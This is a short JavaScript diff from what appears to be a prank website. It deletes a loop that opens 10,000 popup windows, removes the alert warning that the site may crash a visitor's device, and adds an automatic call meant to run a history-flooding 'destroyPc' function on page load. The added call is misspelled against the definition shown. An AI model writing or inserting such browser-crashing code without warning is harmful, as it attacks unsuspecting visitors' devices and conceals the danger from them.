@@ -1,9 +1,5 @@
 
-function openTab(){
-  for (let i = 0; i < 10000; i++) {
-    window.open("https://endberry.github.io/cool_website/", "", "width=300,height=200");
-  };
-};
+destroyPC();
 
 function destroyPc(){
   var total = "";
@@ -12,5 +8,3 @@ function destroyPc(){
     history.pushState(0,0, total );
   };
 };
-
-alert("DISCLAMER!!! This website can make your electronic devise lag or crash");
